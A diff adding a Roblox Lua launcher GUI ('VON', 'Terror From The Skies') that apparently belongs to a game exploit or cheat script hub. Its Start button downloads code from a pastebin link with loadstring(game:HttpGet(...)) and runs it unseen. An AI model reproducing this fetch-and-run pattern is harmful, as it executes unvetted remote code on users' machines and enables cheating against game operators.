@@ -1,0 +1,207 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local TextLabel = Instance.new("TextLabel")
+local UICorner_2 = Instance.new("UICorner")
+local TextLabel_2 = Instance.new("TextLabel")
+local UICorner_3 = Instance.new("UICorner")
+local ImageLabel = Instance.new("ImageLabel")
+local UICorner_4 = Instance.new("UICorner")
+local TextLabel_3 = Instance.new("TextLabel")
+local UICorner_5 = Instance.new("UICorner")
+local TextButton = Instance.new("TextButton")
+local TextButton_2 = Instance.new("TextButton")
+local UICorner_6 = Instance.new("UICorner")
+local ImageLabel_2 = Instance.new("ImageLabel")
+local TextLabel_4 = Instance.new("TextLabel")
+local UICorner_7 = Instance.new("UICorner")
+local ImageLabel_3 = Instance.new("ImageLabel")
+local TextLabel_5 = Instance.new("TextLabel")
+local UICorner_8 = Instance.new("UICorner")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.243967831, 0, 0.194230765, 0)
+Frame.Size = UDim2.new(0.517426252, 0, 0.596153855, 0)
+
+UICorner.Parent = Frame
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(-0.00166792527, 0, 0.0129804062, 0)
+TextLabel.Rotation = 90.000
+TextLabel.Size = UDim2.new(0.122076847, 0, 0.149475694, 0)
+TextLabel.Font = Enum.Font.FredokaOne
+TextLabel.Text = "III"
+TextLabel.TextColor3 = Color3.fromRGB(182, 0, 195)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+UICorner_2.CornerRadius = UDim.new(1, 0)
+UICorner_2.Parent = TextLabel
+
+TextLabel_2.Parent = Frame
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.BorderSizePixel = 0
+TextLabel_2.Position = UDim2.new(0.231698096, 0, 0.0640690252, 0)
+TextLabel_2.Size = UDim2.new(0.55697608, 0, 0.216051206, 0)
+TextLabel_2.Font = Enum.Font.FredokaOne
+TextLabel_2.Text = "\"Terror From The Skies\""
+TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 14.000
+TextLabel_2.TextWrapped = true
+
+UICorner_3.CornerRadius = UDim.new(1, 0)
+UICorner_3.Parent = TextLabel_2
+
+ImageLabel.Parent = Frame
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel.BorderSizePixel = 0
+ImageLabel.Position = UDim2.new(0.787564754, 0, 0.111685872, 0)
+ImageLabel.Size = UDim2.new(0.0690846294, 0, 0.120047241, 0)
+ImageLabel.Image = "rbxassetid://10624238572"
+
+UICorner_4.CornerRadius = UDim.new(1, 0)
+UICorner_4.Parent = ImageLabel
+
+TextLabel_3.Parent = Frame
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
+TextLabel_3.BackgroundTransparency = 1.000
+TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_3.BorderSizePixel = 0
+TextLabel_3.Position = UDim2.new(-0.00318964035, 0, 0.0285851266, 0)
+TextLabel_3.Size = UDim2.new(0.309998512, 0, 0.116051227, 0)
+TextLabel_3.Font = Enum.Font.FredokaOne
+TextLabel_3.Text = "VON"
+TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.TextScaled = true
+TextLabel_3.TextSize = 14.000
+TextLabel_3.TextWrapped = true
+
+UICorner_5.CornerRadius = UDim.new(1, 0)
+UICorner_5.Parent = TextLabel_3
+
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.BackgroundTransparency = 1.000
+TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.BorderSizePixel = 0
+TextButton.Position = UDim2.new(0.892918825, 0, 0, 0)
+TextButton.Size = UDim2.new(0.107081175, 0, 0.162456095, 0)
+TextButton.Font = Enum.Font.FredokaOne
+TextButton.Text = "X"
+TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextScaled = true
+TextButton.TextSize = 14.000
+TextButton.TextWrapped = true
+
+TextButton_2.Parent = Frame
+TextButton_2.BackgroundColor3 = Color3.fromRGB(182, 0, 195)
+TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_2.BorderSizePixel = 0
+TextButton_2.Position = UDim2.new(0.194258779, 0, 0.708798587, 0)
+TextButton_2.Size = UDim2.new(0.629885077, 0, 0.196013287, 0)
+TextButton_2.Font = Enum.Font.FredokaOne
+TextButton_2.Text = "Start"
+TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_2.TextScaled = true
+TextButton_2.TextSize = 14.000
+TextButton_2.TextWrapped = true
+
+UICorner_6.Parent = TextButton_2
+
+ImageLabel_2.Parent = Frame
+ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel_2.BorderSizePixel = 0
+ImageLabel_2.Position = UDim2.new(0.206116468, 0, 0.28010869, 0)
+ImageLabel_2.Size = UDim2.new(0.618027449, 0, 0.116060652, 0)
+ImageLabel_2.Image = "rbxassetid://15095116361"
+
+TextLabel_4.Parent = ImageLabel_2
+TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.BackgroundTransparency = 1.000
+TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_4.BorderSizePixel = 0
+TextLabel_4.Position = UDim2.new(-0.00492050219, 0, -4.24104968e-07, 0)
+TextLabel_4.Size = UDim2.new(1.00492048, 0, 0.999999881, 0)
+TextLabel_4.Font = Enum.Font.FredokaOne
+TextLabel_4.Text = "- Fixed Bugs!"
+TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.TextScaled = true
+TextLabel_4.TextSize = 14.000
+TextLabel_4.TextWrapped = true
+
+UICorner_7.Parent = ImageLabel_2
+
+ImageLabel_3.Parent = Frame
+ImageLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel_3.BorderSizePixel = 0
+ImageLabel_3.Position = UDim2.new(0.206116468, 0, 0.418818355, 0)
+ImageLabel_3.Size = UDim2.new(0.618027449, 0, 0.116060652, 0)
+ImageLabel_3.Image = "rbxassetid://15095179560"
+
+TextLabel_5.Parent = ImageLabel_3
+TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_5.BackgroundTransparency = 1.000
+TextLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_5.BorderSizePixel = 0
+TextLabel_5.Position = UDim2.new(-0.00492050219, 0, -4.24104968e-07, 0)
+TextLabel_5.Size = UDim2.new(0.985358596, 0, 1.00000072, 0)
+TextLabel_5.Font = Enum.Font.FredokaOne
+TextLabel_5.Text = "- Fixed Ui!"
+TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_5.TextScaled = true
+TextLabel_5.TextSize = 14.000
+TextLabel_5.TextWrapped = true
+
+UICorner_8.Parent = ImageLabel_3
+
+-- Scripts:
+
+local function NIKYSB_fake_script() -- TextButton.LocalScript 
+	local script = Instance.new('LocalScript', TextButton)
+
+	script.Parent.MouseButton1Down:Connect(function()
+		script.Parent.Parent.Visible = false
+	end)
+end
+coroutine.wrap(NIKYSB_fake_script)()
+local function PYEGU_fake_script() -- TextButton_2.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_2)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://pastebin.com/raw/RhDjhrKN'))()
+	end)
+end
+coroutine.wrap(PYEGU_fake_script)()
+local function NXLW_fake_script() -- Frame.LocalScript 
+	local script = Instance.new('LocalScript', Frame)
+
+	local Frame = script.Parent
+	
+	Frame.Active = true
+	Frame.Draggable = true
+end
+coroutine.wrap(NXLW_fake_script)()
